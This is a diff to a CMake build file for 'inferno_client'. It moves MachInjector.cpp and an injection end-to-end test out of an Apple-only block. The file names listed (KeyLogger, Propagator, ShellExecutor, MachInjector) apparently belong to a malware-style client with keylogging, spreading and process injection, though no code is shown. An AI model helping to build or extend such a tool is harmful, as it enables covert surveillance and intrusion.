@@ -90,6 +90,7 @@ add_executable(inferno_client
     client/src/Propagator.cpp
     client/src/entry_dylib.cpp
     client/src/EntitlementScanner.cpp
+    client/src/MachInjector.cpp
 )
 target_link_libraries(inferno_client PRIVATE inferno_common)
 
@@ -99,7 +100,6 @@ if(APPLE)
     find_library(IO_KIT IOKit)
     find_library(CORE_FOUNDATION CoreFoundation)
     target_link_libraries(inferno_client PRIVATE ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION})
-    target_sources(inferno_client PRIVATE client/src/MachInjector.cpp)
 endif()
 
 if(WIN32)
@@ -162,6 +162,8 @@ add_executable(inferno_tests
     client/src/ShellExecutor.cpp
     client/src/KeyLogger.cpp
     client/src/Propagator.cpp
+    client/src/MachInjector.cpp
+    tests/inject_e2e_test.cpp
 )
 target_include_directories(inferno_tests PRIVATE client/include)
 target_link_libraries(inferno_tests PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core Qt6::Sql)
@@ -171,11 +173,9 @@ if(APPLE)
     target_link_libraries(inferno_tests PRIVATE ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION})
     target_sources(inferno_tests PRIVATE
         tests/injector_test.cpp
-    tests/scanner_test.cpp
-    tests/inject_e2e_test.cpp
+	tests/scanner_test.cpp
         client/src/entry_dylib.cpp
         client/src/EntitlementScanner.cpp
-        client/src/MachInjector.cpp
     )
     target_compile_definitions(inferno_tests PRIVATE
         TEST_BINARY_DIR="${CMAKE_CURRENT_BINARY_DIR}"
